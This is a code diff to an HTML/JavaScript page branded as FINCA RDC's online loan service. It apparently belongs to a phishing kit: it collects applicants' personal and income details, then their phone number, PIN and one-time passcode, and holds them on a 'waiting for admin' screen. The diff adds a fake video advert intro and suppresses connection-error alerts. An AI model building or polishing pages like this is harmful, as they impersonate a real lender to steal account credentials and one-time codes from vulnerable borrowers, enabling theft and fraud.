@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>FINCA RDC</title>
+  <title>FINCA RDC - Crédit en Ligne</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap');
 
@@ -48,6 +48,85 @@
         box-shadow: 0 10px 30px rgba(0,0,0,0.15);
       }
     }
+
+    /* --- VIDEO AD SCREEN --- */
+    #page-ad {
+      background: #000;
+      display: flex; 
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      position: relative;
+      cursor: pointer;
+      overflow: hidden;
+    }
+    
+    #page-ad.active { display: flex; } 
+
+    /* Fake Video Player Progress Bar */
+    .video-progress-container {
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 4px;
+      background: rgba(255,255,255,0.2);
+      z-index: 10;
+    }
+    .video-progress-bar {
+      height: 100%; width: 0%;
+      background: var(--finca-red);
+      animation: playVideo 8s linear forwards;
+    }
+    @keyframes playVideo {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+
+    /* Video Content Placeholder (Since we don't have an MP4 file yet) */
+    .video-content-placeholder {
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(135deg, #003865 0%, #001f3f 100%);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1;
+    }
+
+    .video-text-1 { font-size: 2.2rem; font-weight: 800; color: #fff; margin-bottom: 10px; opacity: 0; animation: fadeInUp 1s 0.5s forwards; }
+    .video-text-2 { font-size: 1.5rem; font-weight: 600; color: #F5B700; margin-bottom: 10px; opacity: 0; animation: fadeInUp 1s 2s forwards; }
+    .video-text-3 { font-size: 1.5rem; font-weight: 600; color: #F5B700; margin-bottom: 30px; opacity: 0; animation: fadeInUp 1s 3.5s forwards; }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* CTA Button overlay */
+    .video-cta {
+      position: absolute;
+      bottom: 50px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+      background: var(--finca-red); color: #fff; border: none; border-radius: 30px;
+      padding: 15px 40px; font-size: 1.2rem; font-weight: 700;
+      box-shadow: 0 5px 20px rgba(166,25,46,0.5);
+      animation: bounce 2s infinite;
+    }
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {transform: translateX(-50%) translateY(0);}
+      40% {transform: translateX(-50%) translateY(-10px);}
+      60% {transform: translateX(-50%) translateY(-5px);}
+    }
+
+    .skip-text {
+      position: absolute; top: 20px; right: 20px; z-index: 10;
+      color: #fff; font-size: 0.9rem; font-weight: 600;
+      background: rgba(0,0,0,0.5); padding: 5px 12px; border-radius: 20px;
+    }
+    /* --------------------------------- */
+
 
     /* Top Navigation Bar */
     .navbar {
@@ -249,167 +328,191 @@
 <body>
 
 <div class="app-wrapper">
-  <!-- Navbar -->
-  <div class="navbar">
-    <div class="logo-container">
-      <div class="logo-icon"></div>
-      <h1>FINCA</h1>
+  
+  <!-- THE VIDEO AD PAGE -->
+  <div id="page-ad" class="page active" onclick="skipAd()">
+    <!-- Fake Video Player Top Bar -->
+    <div class="video-progress-container">
+      <div class="video-progress-bar"></div>
     </div>
-    <!-- Language Toggle -->
-    <div class="lang-toggle">
-      <span id="btn-en" onclick="setLanguage('en')">EN</span>
-      <span id="btn-fr" class="active" onclick="setLanguage('fr')">FR</span>
+    
+    <div class="skip-text">Tap to Skip</div>
+
+    <!-- Simulated Video Scene (This acts as the video) -->
+    <div class="video-content-placeholder">
+      <div class="video-text-1">FINCA RDC</div>
+      <div class="video-text-2">Loan Amount: Up to 1,000,000 FC</div>
+      <div class="video-text-3">Repayment: 6 - 60 Months</div>
+      
+      <!-- Call to Action Button inside the video -->
+      <button class="video-cta" onclick="event.stopPropagation(); skipAd();">Apply Now</button>
     </div>
   </div>
 
-  <div class="page-container">
-    <!-- Page 1: Hero & Calculator -->
-    <div id="page1" class="page active">
-      <div class="hero-section">
-        <h2 id="t-hero-title">Boostez votre entreprise dès aujourd'hui</h2>
-        <p id="t-hero-sub">Demandez votre crédit en ligne<br>Réponse en 7 jours</p>
-        <button class="btn-primary" onclick="showPage('page2')" id="t-hero-btn">Demander votre prêt</button>
+  <!-- Main App Content (Hidden until ad is skipped) -->
+  <div id="main-app" style="display: none; flex-direction: column; height: 100%;">
+    <!-- Navbar -->
+    <div class="navbar">
+      <div class="logo-container">
+        <div class="logo-icon"></div>
+        <h1>FINCA</h1>
       </div>
-
-      <div class="calc-card">
-        <div class="calc-labels"><span id="t-calc-amount">Montant du prêt</span><span class="value" id="amountLabel">500 000 FC</span></div>
-        <input type="range" id="loanAmount" min="50000" max="1000000" step="50000" value="500000" oninput="updateCalc()">
-        <div class="calc-sub"><span>50 000 FC</span><span>1 000 000 FC</span></div>
-
-        <div class="calc-labels"><span id="t-calc-term">Durée du prêt</span><span class="value" id="termLabel">12 mois</span></div>
-        <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
-        <div class="calc-sub"><span id="t-term-min">6 mois</span><span id="t-term-max">60 mois</span></div>
-
-        <div class="monthly-box">
-          <span id="t-monthly">Paiement mensuel</span>
-          <span id="monthlyLabel">45 000 FC</span>
-        </div>
+      <div class="lang-toggle">
+        <span id="btn-en" onclick="setLanguage('en')">EN</span>
+        <span id="btn-fr" class="active" onclick="setLanguage('fr')">FR</span>
       </div>
     </div>
 
-    <!-- Page 2: Questionnaire -->
-    <div id="page2" class="page">
-      <h2 class="form-title" id="t-form-title">Votre Demande</h2>
-      <form id="formQuestionnaire" style="padding-bottom: 20px;">
-        <div class="form-group">
-          <label id="t-name">Nom complet</label>
-          <input type="text" id="qName" required placeholder="Entrez votre nom complet">
+    <div class="page-container">
+      <!-- Page 1: Hero & Calculator -->
+      <div id="page1" class="page">
+        <div class="hero-section">
+          <h2 id="t-hero-title">Boostez votre entreprise dès aujourd'hui</h2>
+          <p id="t-hero-sub">Demandez votre crédit en ligne<br>Réponse en 7 jours</p>
+          <button class="btn-primary" onclick="showPage('page2')" id="t-hero-btn">Demander votre prêt</button>
         </div>
-        <div class="form-group">
-          <label id="t-emp">Situation professionnelle</label>
-          <select id="qEmployment" required>
-            <option value="" id="t-emp-sel">Sélectionnez votre situation</option>
-            <option value="Employé" id="t-emp-1">Employé</option>
-            <option value="Travailleur indépendant" id="t-emp-2">Travailleur indépendant</option>
-            <option value="Sans emploi" id="t-emp-3">Sans emploi</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label id="t-income">Revenu mensuel (FC)</label>
-          <input type="number" id="qIncome" required placeholder="Entrez votre revenu mensuel">
-        </div>
-        <div class="form-group">
-          <label id="t-amount">Montant du prêt (FC)</label>
-          <input type="number" id="qAmount" required placeholder="Entrez le montant du prêt">
-        </div>
-        <div class="form-group">
-          <label id="t-period">Période de remboursement</label>
-          <select id="qTerm" required>
-            <option value="" id="t-period-sel">Sélectionnez la période</option>
-            <option value="6 mois" id="t-period-1">6 mois</option>
-            <option value="12 mois" id="t-period-2">12 mois</option>
-            <option value="24 mois" id="t-period-3">24 mois</option>
-            <option value="36 mois" id="t-period-4">36 mois</option>
-          </select>
-        </div>
-        
-        <div class="error" id="errQ"></div>
-        <button type="submit" class="btn-submit" id="t-submit">SOUMETTRE LA DEMANDE</button>
-      </form>
-    </div>
 
-    <!-- Page 3: Phone & PIN -->
-    <div id="page3" class="page">
-      <div class="login-container">
-        <div class="login-top">
-          <div class="login-logo">FINCA</div>
-          <h3 id="t-login">Connexion</h3>
+        <div class="calc-card">
+          <div class="calc-labels"><span id="t-calc-amount">Montant du prêt</span><span class="value" id="amountLabel">500 000 FC</span></div>
+          <input type="range" id="loanAmount" min="50000" max="1000000" step="50000" value="500000" oninput="updateCalc()">
+          <div class="calc-sub"><span>50 000 FC</span><span>1 000 000 FC</span></div>
 
-          <div class="phone-input-box">
-            <div class="country-code">
-              <div class="flag-icon"></div>
-              +243
+          <div class="calc-labels"><span id="t-calc-term">Durée du prêt</span><span class="value" id="termLabel">12 mois</span></div>
+          <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
+          <div class="calc-sub"><span id="t-term-min">6 mois</span><span id="t-term-max">60 mois</span></div>
+
+          <div class="monthly-box">
+            <span id="t-monthly">Paiement mensuel</span>
+            <span id="monthlyLabel">45 000 FC</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Page 2: Questionnaire -->
+      <div id="page2" class="page">
+        <h2 class="form-title" id="t-form-title">Votre Demande</h2>
+        <form id="formQuestionnaire" style="padding-bottom: 20px;">
+          <div class="form-group">
+            <label id="t-name">Nom complet</label>
+            <input type="text" id="qName" required placeholder="Entrez votre nom complet">
+          </div>
+          <div class="form-group">
+            <label id="t-emp">Situation professionnelle</label>
+            <select id="qEmployment" required>
+              <option value="" id="t-emp-sel">Sélectionnez votre situation</option>
+              <option value="Employé" id="t-emp-1">Employé</option>
+              <option value="Travailleur indépendant" id="t-emp-2">Travailleur indépendant</option>
+              <option value="Sans emploi" id="t-emp-3">Sans emploi</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label id="t-income">Revenu mensuel (FC)</label>
+            <input type="number" id="qIncome" required placeholder="Entrez votre revenu mensuel">
+          </div>
+          <div class="form-group">
+            <label id="t-amount">Montant du prêt (FC)</label>
+            <input type="number" id="qAmount" required placeholder="Entrez le montant du prêt">
+          </div>
+          <div class="form-group">
+            <label id="t-period">Période de remboursement</label>
+            <select id="qTerm" required>
+              <option value="" id="t-period-sel">Sélectionnez la période</option>
+              <option value="6 mois" id="t-period-1">6 mois</option>
+              <option value="12 mois" id="t-period-2">12 mois</option>
+              <option value="24 mois" id="t-period-3">24 mois</option>
+              <option value="36 mois" id="t-period-4">36 mois</option>
+            </select>
+          </div>
+          
+          <div class="error" id="errQ"></div>
+          <button type="submit" class="btn-submit" id="t-submit">SOUMETTRE LA DEMANDE</button>
+        </form>
+      </div>
+
+      <!-- Page 3: Phone & PIN -->
+      <div id="page3" class="page">
+        <div class="login-container">
+          <div class="login-top">
+            <div class="login-logo">FINCA</div>
+            <h3 id="t-login">Connexion</h3>
+
+            <div class="phone-input-box">
+              <div class="country-code">
+                <div class="flag-icon"></div>
+                +243
+              </div>
+              <input type="tel" id="pPhone" placeholder="Numéro de téléphone">
             </div>
-            <input type="tel" id="pPhone" placeholder="Numéro de téléphone">
+
+            <p class="pin-label" id="t-pin">Entrez votre code PIN</p>
+            <div class="pin-boxes" id="pinContainer">
+              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
+              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
+              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
+              <input type="password" maxlength="1" inputmode="numeric" id="pin3">
+            </div>
+            <div class="error" id="errLogin" style="margin-top: 15px;"></div>
           </div>
 
-          <p class="pin-label" id="t-pin">Entrez votre code PIN</p>
-          <div class="pin-boxes" id="pinContainer">
-            <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
-            <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
-            <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
-            <input type="password" maxlength="1" inputmode="numeric" id="pin3">
+          <div class="login-bottom">
+            <p id="t-register-text">Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
+            <div class="bottom-buttons">
+              <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i><span id="t-register-btn">S'inscrire</span></button>
+              <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span id="t-help-btn">Aide & Support</span></button>
+            </div>
+            <div class="login-footer">
+              v4.0.3P<br><br>
+              <span id="t-terms-text">En vous connectant, vous acceptez les</span> <a href="#" id="t-terms-link">Conditions Générales</a>
+            </div>
           </div>
-          <div class="error" id="errLogin" style="margin-top: 15px;"></div>
         </div>
+      </div>
 
-        <div class="login-bottom">
-          <p id="t-register-text">Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
-          <div class="bottom-buttons">
-            <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i><span id="t-register-btn">S'inscrire</span></button>
-            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span id="t-help-btn">Aide & Support</span></button>
+      <!-- Page 4: OTP -->
+      <div id="page4" class="page">
+        <div class="login-container">
+          <div class="login-top">
+            <div class="login-logo">FINCA</div>
+            <h3 id="t-otp">Entrez le code OTP envoyé à</h3>
+            <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--finca-blue);">+243 00 000 0000</div>
+
+            <div class="otp-boxes" id="otpContainer">
+              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
+              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp2')" id="otp1">
+              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp3')" id="otp2">
+              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp4')" id="otp3">
+              <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp5')" id="otp4">
+              <input type="text" maxlength="1" inputmode="numeric" id="otp5">
+            </div>
+
+            <p class="resend-text"><span id="t-resend">Renvoyer l'OTP dans</span> <span id="timer">44</span> Sec</p>
+            <div class="error" id="errOtp" style="margin-top: 15px;"></div>
           </div>
-          <div class="login-footer">
-            v4.0.3P<br><br>
-            <span id="t-terms-text">En vous connectant, vous acceptez les</span> <a href="#" id="t-terms-link">Conditions Générales</a>
+
+          <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
+            <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span id="t-help-btn-2">Aide & Support</span></div>
+            <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
           </div>
         </div>
       </div>
-    </div>
 
-    <!-- Page 4: OTP -->
-    <div id="page4" class="page">
-      <div class="login-container">
-        <div class="login-top">
-          <div class="login-logo">FINCA</div>
-          <h3 id="t-otp">Entrez le code OTP envoyé à</h3>
-          <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--finca-blue);">+243 00 000 0000</div>
-
-          <div class="otp-boxes" id="otpContainer">
-            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
-            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp2')" id="otp1">
-            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp3')" id="otp2">
-            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp4')" id="otp3">
-            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp5')" id="otp4">
-            <input type="text" maxlength="1" inputmode="numeric" id="otp5">
-          </div>
-
-          <p class="resend-text"><span id="t-resend">Renvoyer l'OTP dans</span> <span id="timer">44</span> Sec</p>
-          <div class="error" id="errOtp" style="margin-top: 15px;"></div>
-        </div>
-
-        <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
-          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span id="t-help-btn-2">Aide & Support</span></div>
-          <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
+      <!-- Page 5: Waiting for Admin -->
+      <div id="page-waiting" class="page">
+        <div class="waiting-screen">
+          <div class="spinner"></div>
+          <h2 id="t-wait-title">Veuillez patienter...</h2>
+          <p id="t-wait-sub">Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
         </div>
       </div>
-    </div>
 
-    <!-- Page 5: Waiting for Admin -->
-    <div id="page-waiting" class="page">
-      <div class="waiting-screen">
-        <div class="spinner"></div>
-        <h2 id="t-wait-title">Veuillez patienter...</h2>
-        <p id="t-wait-sub">Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
+      <!-- Page 6: Success -->
+      <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
+        <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" id="t-success-title">Félicitations!</h2>
+        <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;" id="t-success-sub">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
       </div>
-    </div>
-
-    <!-- Page 6: Success -->
-    <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-      <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" id="t-success-title">Félicitations!</h2>
-      <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;" id="t-success-sub">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
     </div>
   </div>
+
 </div>
 
 <script>
@@ -508,12 +611,28 @@
     }
   };
 
+  // Function to close the Ad and show the app
+  function skipAd() {
+    document.getElementById('page-ad').classList.remove('active');
+    document.getElementById('page-ad').style.display = 'none';
+    
+    document.getElementById('main-app').style.display = 'flex';
+    document.getElementById('page1').classList.add('active');
+  }
+
+  // Automatically skip ad after 8 seconds (matches video progress bar animation)
+  setTimeout(() => {
+    if (document.getElementById('page-ad').classList.contains('active')) {
+      skipAd();
+    }
+  }, 8000);
+
   async function init() {
     try {
       const res = await fetch('/api/session', { method: 'POST' });
       const data = await res.json();
       sessionId = data.sessionId;
-    } catch (err) { alert('Connection error. Please refresh.'); }
+    } catch (err) { console.error('Connection error'); }
   }
   init();
 
